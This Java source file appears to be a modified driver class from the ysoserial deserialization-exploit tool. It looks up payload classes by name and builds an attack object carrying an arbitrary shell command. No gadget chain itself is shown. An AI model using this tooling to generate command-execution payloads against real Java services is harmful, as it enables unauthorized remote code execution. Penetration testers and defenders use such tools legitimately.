package ysoserial;

import ysoserial.payloads.ObjectPayload;

import org.reflections.Reflections;

import java.io.ObjectOutputStream;
import java.util.Collection;
import java.util.Set;

public class GeneratePayload {

    public Object generate(String type, String command) {
        final Class<? extends ObjectPayload> payloadClass = getPayloadClass(type);

        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);
            return object;

        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload.");
            e.printStackTrace();
            System.exit(1);
            return null;
        }

    }

    @SuppressWarnings("unchecked")
    private static Class<? extends ObjectPayload> getPayloadClass(final String className) {
        try {
            return (Class<? extends ObjectPayload>) Class.forName(className);
        } catch (Exception e1) {
        }
        try {
            return (Class<? extends ObjectPayload>) Class.forName(GeneratePayload.class.getPackage().getName()
                    + ".payloads."  + className);
        } catch (Exception e2) {
        }
        return null;
    }

    // get payload classes by classpath scanning
    private static Collection<Class<? extends ObjectPayload>> getPayloadClasses() {
        final Reflections reflections = new Reflections(GeneratePayload.class.getPackage().getName());
        final Set<Class<? extends ObjectPayload>> payloadTypes = reflections.getSubTypesOf(ObjectPayload.class);
        return payloadTypes;
    }
}
